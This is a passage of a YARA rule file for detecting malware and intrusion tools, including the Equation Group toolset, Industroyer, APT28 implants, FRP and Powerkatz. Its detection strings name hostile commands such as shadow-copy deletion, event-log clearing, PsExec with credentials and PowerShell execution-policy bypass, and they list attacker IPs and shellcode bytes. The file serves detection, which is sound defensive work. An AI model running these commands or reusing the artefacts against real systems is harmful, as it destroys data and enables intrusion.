		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L708-L725"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1a010d5e6324715f8e1bf29e957c365fabd2986fece53aaea23bba8ee59bd808"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "59d60835fe200515ece36a6e87e642ee8059a40cb04ba5f4b9cce7374a3e7735"

	strings:
		$x1 = "To disable password checking on target:" fullword ascii
		$x2 = "[-] target is running" fullword ascii
		$x3 = "[-] problem importing version-specific shellcode from" fullword ascii
		$x4 = "[+] importing version-specific shellcode" fullword ascii
		$s5 = "[-] unsupported target version, abort" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Sploit_Py
{
	meta:
		description = "EQGRP Toolset Firewall - file sploit.py"
		author = "Florian Roth (Nextron Systems)"
		id = "9f403965-5fb1-55b2-bef6-65c18e08e58f"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L727-L742"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "874eaffcbc191951db39ba6c85e8c80b83b0df8d33136b6cdcdefcb28e596474"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6"

	strings:
		$x1 = "the --spoof option requires 3 or 4 fields as follows redir_ip" ascii
		$x2 = "[-] timeout waiting for response - target may have crashed" fullword ascii
		$x3 = "[-] no response from health check - target may have crashed" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Uninstallpbd
{
	meta:
		description = "EQGRP Toolset Firewall - file uninstallPBD.bat"
		author = "Florian Roth (Nextron Systems)"
		id = "0153cb2a-a0de-51f9-80c2-22136d56f16d"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L744-L759"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "51be8a491a1e228dfc6156a86e9f2ffc923c39d0649bbc031ea1bafe1af22a45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "692fdb449f10057a114cf2963000f52ce118d9a40682194838006c66af159bd0"

	strings:
		$s1 = "memset 00e9a05c 4 38845b88" fullword ascii
		$s2 = "_hidecmd" ascii
		$s3 = "memset 013abd04 1 0d" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_EQGRP_Storefc
{
	meta:
		description = "EQGRP Toolset Firewall - file StoreFc.py"
		author = "Florian Roth (Nextron Systems)"
		id = "48bbf5c9-e884-5126-93a2-d27650409882"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L844-L859"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f07c3ef83808852f70fb5cbc4436d531675344ab74f83888cd70d987c3544cce"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "f155cce4eecff8598243a721389046ae2b6ca8ba6cb7b4ac00fd724601a56108"

	strings:
		$x1 = "Usage: StoreFc.py --configFile=<path to xml file> --implantFile=<path to BinStore implant> [--outputFile=<file to write the conf" ascii
		$x2 = "raise Exception, \"Must supply both a config file and implant file.\"" fullword ascii
		$x3 = "This is wrapper for Store.py that FELONYCROWBAR will use. This" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Callbacks
{
	meta:
		description = "EQGRP Toolset Firewall - Callback addresses"
		author = "Florian Roth (Nextron Systems)"
		id = "dd1fbe09-4def-562d-825d-e790dc2c3dd9"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L1260-L1272"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "34881cf8f9f29482a1e129f0f61470d4cc3fa6b78b9f6dda25862371896deca7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "30.40.50.60:9342" fullword ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Extrabacon_Output
{
	meta:
		description = "EQGRP Toolset Firewall - Extrabacon exploit output"
		author = "Florian Roth (Nextron Systems)"
		id = "b2070ed7-e95a-534a-8f27-63c5ca9251b4"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L1274-L1290"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5e71a4380dd30e68d89add1718976d3207a161d2d61fd4c3250fc4b10a0f53a0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "|###[ SNMPresponse ]###" fullword ascii
		$s2 = "[+] generating exploit for exec mode pass-disable" fullword ascii
		$s3 = "[+] building payload for mode pass-disable" fullword ascii
		$s4 = "[+] Executing:  extrabacon" fullword ascii
		$s5 = "appended AAAADMINAUTH_ENABLE payload" fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_EQGRP_Unique_Strings
{
	meta:
		description = "EQGRP Toolset Firewall - Unique strings"
		author = "Florian Roth (Nextron Systems)"
		id = "08f5f1e3-ce4e-54ef-922f-50446edfcd70"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L1292-L1305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "070358ec9cccb5d9daa4e5a016d4f9a988b600d675484f06dc9a897cadf7af0c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "/BananaGlee/ELIGIBLEBOMB" ascii
		$s2 = "Protocol must be either http or https (Ex: https://1.2.3.4:1234)"

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_RC5_RC6_Opcode
{
	meta:
		description = "EQGRP Toolset Firewall - RC5 / RC6 opcode"
		author = "Florian Roth (Nextron Systems)"
		id = "b12a1a2c-8d32-5318-a658-6aa1a08c3263"
		date = "2016-08-17"
		modified = "2023-12-05"
		reference = "https://securelist.com/blog/incidents/75812/the-equation-giveaway/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L1307-L1326"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a79208c5924e1d5cc9db922f80403514e516eadb725393c1ebc9a6236ca90b98"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = { 8B 74 91 FC 81 EE 47 86 C8 61 89 34 91 42 83 FA 2B }

	condition:
		1 of them
}

rule SIGNATURE_BASE_Equationdrug_MS_Identifier
{
	meta:
		description = "Microsoft Identifier used in EquationDrug Platform"
		author = "Florian Roth (Nextron Systems) @4nc4p"
		id = "c934c117-bf5a-5688-acd9-5d6c6aacd6bc"
		date = "2015-03-11"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L1937-L1948"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7b919c82b6e765be5adb927bf79d13f9b37a214a6f8a1f7b237a88ba46ae958c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Microsoft(R) Windows (TM) Operating System" fullword wide

	condition:
		$s1 and pe.timestamp > 946684800
}

rule SIGNATURE_BASE_Industroyer_Portscan_3_Output
{
	meta:
		description = "Detects Industroyer related custom port scaner output file"
		author = "Florian Roth (Nextron Systems)"
		id = "4469f056-674c-5a44-84a5-12a65b8586d5"
		date = "2017-06-13"
		modified = "2023-12-05"
		reference = "https://goo.gl/x81cSy"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_industroyer.yar#L102-L115"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6a2fc7b66b1e93f523e08e12ba420d261bae198918bb09eac1a7cdecc04a6737"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "WSA library load complite." fullword ascii
		$s2 = "Connection refused" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_TA17_293A_Malware_1
{
	meta:
		description = "inveigh pen testing tools & related artifacts"
		author = "US-CERT Code Analysis Team (modified by Florian Roth)"
		id = "297611c9-f4b1-5618-bd43-5a7444365727"
		date = "2017-07-17"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ta17_293A.yar#L14-L75"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "408297496dfb1cc28e1caa7faaf8537b7970bb1742e1b373175f8273fe11f19d"
		score = 50
		quality = 75
		tags = ""
		hash0 = "61C909D2F625223DB2FB858BBDF42A76"
		hash1 = "A07AA521E7CAFB360294E56969EDA5D6"
		hash2 = "BA756DD64C1147515BA2298B6A760260"
		hash3 = "8943E71A8C73B5E343AA9D2E19002373"
		hash4 = "04738CA02F59A5CD394998A99FCD9613"
		hash5 = "038A97B4E2F37F34B255F0643E49FC9D"
		hash6 = "65A1A73253F04354886F375B59550B46"
		hash7 = "AA905A3508D9309A93AD5C0EC26EBC9B"
		hash8 = "5DBEF7BDDAF50624E840CCBCE2816594"
		hash9 = "722154A36F32BA10E98020A8AD758A7A"
		hash10 = "4595DBE00A538DF127E0079294C87DA0"

	strings:
		$n1 = "file://"
		$ax1 = "184.154.150.66"
		$ax2 = "5.153.58.45"
		$ax3 = "62.8.193.206"
		$ax4 = "/pshare1/icon"
		$ax5 = "/ame_icon.png"
		$ax6 = "/1/ree_stat/p"
		$s1 = "(g.charCodeAt(c)^l[(l[b]+l[e])%256])"
		$s2 = "for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)"
		$s3 = "VXNESWJfSjY3grKEkEkRuZeSvkE="
		$s4 = "NlZzSZk="
		$s5 = "WlJTb1q5kaxqZaRnser3sw=="
		$x1 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }
		$x2 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }
		$x3 = "fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])"
		$x4 = "ps.exe -accepteula \\%ws% -u %user% -p %pass% -s cmd /c netstat"
		$x5 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }
		$x6 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }
		$x7 = { 476F206275696C642049443A202266626433373937623163313465306531 }
		$x8 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }
		$x9 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }
		$x10 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }
		$x11 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }
		$x12 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }
		$x13 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }
		$x14 = "http://bit.ly/2m0x8IH"

	condition:
		($n1 and 1 of ( $ax* ) ) or 2 of ( $s* ) or 1 of ( $x* )
}

rule SIGNATURE_BASE_HKTL_FRP_Apr20_1
{
	meta:
		description = "Detects FRP fast reverse proxy tool often used by threat groups"
		author = "Florian Roth (Nextron Systems)"
		id = "55483832-0e0b-5c28-8be5-dbd14ddb50e3"
		date = "2020-04-07"
		modified = "2022-11-03"
		reference = "https://github.com/fatedier/frp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_frp_proxy.yar#L2-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "21f91fd99aed8b62d804504889c41ca77567fd345cf4ea0ef00161eefa9324a7"
		score = 70
		quality = 85
		tags = ""
		hash1 = "05537c1c4e29db76a24320fb7cb80b189860389cdb16a9dbeb0c8d30d9b37006"
		hash2 = "08c685c8febb5385f7548c2a64a27bae7123a937c5af958ebc08a3accb29978d"

	strings:
		$x1 = "frp/vendor/github.com/spf13/" ascii
		$x2 = "github.com/fatedier/frp/vendor/" ascii
		$fpg2 = "<html"
		$fpg3 = "<HTML"
		$fpg6 = "<?xml"

	condition:
		1 of ( $x* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_HKTL_Lazycat_Logeraser
{
	meta:
		description = "Detetcs a tool used in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "a3d74657-a389-5482-ab26-966e790afd50"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_aus_parl_compromise.yar#L113-L135"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2b4b69dd675172b9b0c08fac674b6daa107535694b4073750501627fb48d12c2"
		score = 75
		quality = 35
		tags = ""
		hash1 = "1c113dce265e4d744245a7c55dadc80199ae972a9e0ecbd0c5ced57067cf755b"
		hash2 = "510375f8142b3651df67d42c3eff8d2d880987c0e057fc75a5583f36de34bf0e"

	strings:
		$x1 = "LazyCat.dll" ascii wide fullword
		$x2 = ".local_privilege_escalation.rotten_potato" ascii wide
		$x3 = "LazyCat.Extension" ascii wide
		$x4 = " MEOWof" ascii wide
		$x5 = "VirtualSite: {0}, Address: {1:X16}, Name: {2}, Handle: {3:X16}, LogPath: {4}" fullword wide
		$s1 = "LazyCat" fullword ascii wide
		$s2 = "$e3ff37f2-85d7-4b24-a385-7eeb1f5a9562"
		$s3 = "local -> remote {0} bytes"
		$s4 = "remote -> local {0} bytes"

	condition:
		3 of them
}

rule SIGNATURE_BASE_HKTL_Powerkatz_Feb19_1
{
	meta:
		description = "Detetcs a tool used in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "294d6f6c-dbc8-5431-87a0-64abe582c4ea"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_aus_parl_compromise.yar#L137-L152"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d1d39d68c5c5a3f6142a966925e2a136e937bc09abddd4080862346683886455"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "Powerkatz32" ascii wide fullword
		$x2 = "Powerkatz64" ascii wide
		$s1 = "GetData: not found taskName" fullword ascii wide
		$s2 = "GetRes Ex:" fullword ascii wide

	condition:
		1 of ( $x* ) and 1 of ( $s* )
}

rule SIGNATURE_BASE_HKTL_Unknown_Feb19_1
{
	meta:
		description = "Detetcs a tool used in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "bdcadc4b-8881-5dc7-b203-4e79cbc850ed"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_aus_parl_compromise.yar#L154-L172"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "231c771ed24106a8daf352a0df1bc2db43ebd8d1108d7fa1162d03d40e738d46"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "not a valid timeout format!" ascii wide fullword
		$x2 = "host can not be empty!" ascii wide fullword
		$x3 = "not a valid port format!" ascii wide fullword
		$x4 = "{0} - {1} TTL={2} time={3}" ascii wide fullword
		$x5 = "ping count is not a correct format!" ascii wide fullword
		$s1 = "The result is too large,program store to '{0}'.Please download it manully." fullword ascii wide
		$s2 = "C:\\Windows\\temp\\" ascii wide

	condition:
		1 of ( $x* ) or 2 of them
}

rule SIGNATURE_BASE_IMPLANT_3_V1
{
	meta:
		description = "X-Agent/CHOPSTICK Implant by APT28"
		author = "US CERT"
		id = "d539bb31-18b2-5cf5-b994-daecd5f8c771"
		date = "2017-02-10"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_grizzlybear_uscert.yar#L425-L442"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4c7b6c76bc10784abf96cc71b34ffc9a9de569fd536505528752221d22b26629"
		score = 85
		quality = 85
		tags = ""

	strings:
		$STR1 = ">process isn't exist<" ascii wide
		$STR2 = "shell\\open\\command=\"System Volume Information\\USBGuard.exe\" install" ascii wide
		$STR3 = "User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0" ascii wide
		$STR4 = "webhp?rel=psy&hl=7&ai=" ascii wide
		$STR5 = {0f b6 14 31 88 55 ?? 33 d2 8b c1 f7 75 ?? 8b 45 ?? 41 0f b6 14
         02 8a 45 ?? 03 fa}

	condition:
		any of them
}

rule SIGNATURE_BASE_IMPLANT_4_V8
{
	meta:
		description = "BlackEnergy / Voodoo Bear Implant by APT28"
		author = "US CERT"
		id = "1e82d105-8dda-55c9-aec0-8f9f02c3a94e"
		date = "2017-02-10"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_grizzlybear_uscert.yar#L883-L911"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "dd072702c59822587d7ede0bc59c5672fbaa9a05595940781554fadb32e109f7"
		score = 85
		quality = 85
		tags = ""

	strings:
		$f1 = {5E 81 EC 04 01 00 00 8B D4 68 04 01 00 00 52 6A 00 FF 57 1C 8B D4
         33 C9 03 D0 4A 41 3B C8 74 05 80 3A 5C 75 F5 42 81 EC 04 01 00 00 8B
         DC 52 51 53 68 04 01 00 00 FF 57 20 59 5A 66 C7 04 03 5C 20 56 57 8D
         3C 03 8B F2 F3 A4 C6 07 00 5F 5E 33 C0 50 68 80 00 00 00 6A 02 50 50
         68 00 00 00 40 53 FF 57 14 53 8B 4F 4C 8B D6 33 DB 30 1A 42 43 3B D9
         7C F8 5B 83 EC 04 8B D4 50 6A 00 52 FF 77 4C 8B D6 52 50 FF 57 24 FF
         57 18}
		$f2 = {5E 83 EC 1C 8B 45 08 8B 4D 08 03 48 3C 89 4D E4 89 75 EC 8B 45 08
         2B 45 10 89 45 E8 33 C0 89 45 F4 8B 55 0C 3B 55 F4 0F 86 98 00 00 00
         8B 45 EC 8B 4D F4 03 48 04 89 4D F4 8B 55 EC 8B 42 04 83 E8 08 D1 E8
         89 45 F8 8B 4D EC 83 C1 08 89 4D FC}
		$f3 = {5F 8B DF 83 C3 60 2B 5F 54 89 5C 24 20 8B 44 24 24 25 00 00 FF FF
         66 8B 18 66 81 FB 4D 5A 74 07 2D 00 00 01 00 EB EF 8B 48 3C 03 C8 66
         8B 19 66 81 FB 50 45 75 E0 8B E8 8B F7 83 EC 60 8B FC B9 60 00 00 00
         F3 A4 83 EF 60 6A 0D 59 E8 88 00 00 00 E2 F9 68 6C 33 32 00 68 73 68
         65 6C 54 FF 57}
		$a1 = {83 EC 04 60 E9 1E 01 00 00}

	condition:
		$a1 at pe.entry_point or any of ( $f* )
}

rule SIGNATURE_BASE_IMPLANT_4_V9
{
	meta:
		description = "BlackEnergy / Voodoo Bear Implant by APT28"
		author = "US CERT"
		id = "a404212a-d9ef-54c1-bbf8-a213ec094f18"
		date = "2017-02-10"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_grizzlybear_uscert.yar#L913-L933"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c0e48bf0839965f9bda9cc475aba5b4934c27c426a8fa4423fb24aa9d792e2e4"
		score = 85
		quality = 77
		tags = ""

	strings:
		$a = "wevtutil clear-log" ascii wide nocase
		$b = "vssadmin delete shadows" ascii wide nocase
		$c = "AGlobal\\23d1a259-88fa-41df-935f-cae523bab8e6" ascii wide nocase
		$d = "Global\\07fd3ab3-0724-4cfd-8cc2-60c0e450bb9a" ascii wide nocase
		$openPhysicalDiskOverwriteWithZeros = { 57 55 33 C9 51 8B C3 99 57 52
         50 E8 ?? ?? ?? ?? 52 50 E8 ?? ?? ?? ?? 83 C4 10 84 C0 75 21 33 C0 89
         44 24 10 89 44 24 14 6A 01 8B C7 99 8D 4C 24 14 51 52 50 56 FF 15 ??
         ?? ?? ?? 85 C0 74 0B 83 C3 01 81 FB 00 01 00 00 7C B6 }
		$f = {83 c4 0c 53 53 6a 03 53 6a 03 68 00 00 00 c0}

	condition:
		($a and $b ) or $c or $d or ( $openPhysicalDiskOverwriteWithZeros and $f )
}

rule SIGNATURE_BASE_IMPLANT_5_V1
{
	meta:
		description = "XTunnel Implant by APT28"
		author = "US CERT"
		id = "dee08753-3465-5bf2-acd5-aa6cc80aba3c"
		date = "2017-02-10"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_grizzlybear_uscert.yar#L1034-L1051"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d94192d408036bf02052dc5145b78fea61323810b2abdbba64c65e1f6387ea42"
		score = 85
		quality = 85
		tags = ""

	strings:
		$hexstr = {2D 00 53 00 69 00 00 00 2D 00 53 00 70 00 00 00 2D 00 55 00
         70 00 00 00 2D 00 50 00 69 00 00 00 2D 00 50 00 70 00 00 00}
		$UDPMSG1 = "error 2005 recv from server UDP - %d\x0a"
		$TPSMSG1 = "error 2004 send to TPS - %d\x0a"
		$TPSMSG2 = "error 2003 recv from TPS - %d\x0a"
		$UDPMSG2 = "error 2002 send to server UDP - %d\x0a"

	condition:
		any of them
}

rule SIGNATURE_BASE_IMPLANT_5_V2
{
	meta:
		description = "XTunnel Implant by APT28"
		author = "US CERT"
		id = "40f60306-41ee-5a18-84e2-cf479a6bc849"
		date = "2017-02-10"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_grizzlybear_uscert.yar#L1053-L1192"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "43e3df19ecd2068636b92c7a5c0399b22f8fa478e3e1562f392e78c5a268a1e5"
		score = 85
		quality = 60
		tags = ""

	strings:
		$key0 = { 987AB999FE0924A2DF0A412B14E26093746FCDF9BA31DC05536892C33B116AD3 }
		$key1 = { 8B236C892D902B0C9A6D37AE4F9842C3070FBDC14099C6930158563C6AC00FF5 }
		$key2 = { E47B7F110CAA1DA617545567EC972AF3A6E7B4E6807B7981D3CFBD3D8FCC3373 }
		$key3 = { 48B284545CA1FA74F64FDBE2E605D68CED8A726D05EBEFD9BAAC164A7949BDC1 }
		$key4 = { FB421558E30FCCD95FA7BC45AC92D2991C44072230F6FBEAA211341B5BF2DC56 }
		$key5 = { 34F1AE17017AF16021ADA5CE3F77675BBC6E7DEC6478D6078A0B22E5FDFF3B31 }
		$key6 = { F0EA48F164395186E6F754256EBB812A2AFE168E77ED9501F8B8E6F5B72126A7 }
		$key7 = { 0B6E9970A8EAF68EE14AB45005357A2F3391BEAA7E53AB760B916BC2B3916ABE }
		$key8 = { FF032EA7ED2436CF6EEA1F741F99A3522A61FDA8B5A81EC03A8983ED1AEDAB1A }
		$key9 = { F0DAC1DDFEF7AC6DE1CBE1006584538FE650389BF8565B32E0DE1FFACBCB14BB }
		$key10 = { A5D699A3CD4510AF11F1AF767602055C523DF74B94527D74319D6EFC6883B80D }
		$key11 = { 5951B02696C1D5A7B2851D28872384DA607B25F4CEA268FF3FD7FBA75AB3B4B3 }
		$key12 = { 0465D99B26AF42D8346001BB838595E301BAD8CF5D40CE9C17C944717DF82481 }
		$key13 = { 5DFE1C83AD5F5CE1BF5D9C42E23225E3ECFDB2493E80E6554A2AC7C722EB4880 }
		$key14 = { E9650396C45F7783BC14C59F46EA8232E8357C26B5627BFF8C42C6AE2E0F2E17 }
		$key15 = { 7432AE389125BB4E3980ED7F6A6FB252A42E785A90F4591C3620CA642FF97CA3 }
		$key16 = { 2B2ADBBC4F960A8916F7088067BAD30BE84B65783FBF9476DF5FDA0E5856B183 }
		$key17 = { 808C3FD0224A59384161B8A81C8BB404D7197D16D8118CB77067C5C8BD764B3E }
		$key18 = { 028B0E24D5675C16C815BFE4A073E9778C668E65771A1CE881E2B03F58FC7D5B }
		$key19 = { 878B7F5CF2DC72BAF1319F91A4880931EE979665B1B24D3394FE72EDFAEF4881 }
		$key20 = { 7AC7DD6CA34F269481C526254D2F563BC6ECA1779FEEAA33EC1C20E60B686785 }
		$key21 = { 3044F1D394186815DD8E3A2BBD9166837D07FA1CF6A550E2C170C9CDD9305209 }
		$key22 = { 7544DC095C441E39D258648FE9CB1267D20D83C8B2D3AB734474401DA4932619 }
		$key23 = { D702223347406C1999D1A9829CBBE96EC86D377A40E2EE84562EA1FAC1C71498 }
		$key24 = { CA36CB1177382A1009D392A58F7C1357E94AD2292CC0AE82EE4F7DB0179148E1 }
		$key25 = { C714F23E4C1C4E55F0E1FA7F5D0DD64658A86F84681D07576D840784154F65DC }
		$key26 = { 63571BAF736904634AFEE2A70CB9ED64615DE8CA7AEF21E773286B8877D065DB }
		$key27 = { 27808A9BE98FFE348DE1DB999AC9FDFB26E6C5A0D5E688490EF3D186C43661EB }
		$key28 = { B6EB86A07A85D40866AFA100789FFB9E85C13F5AA7C7A3B6BA753C7EAB9D6A62 }
		$key29 = { 88F0020375D60BDB85ACDBFE4BD79CD098DB2B3FA2CEF55D4331DBEFCE455157 }
		$key30 = { 36535AAB296587AE1162AC5D39492DD1245811C72706246A38FF590645AA5D7B }
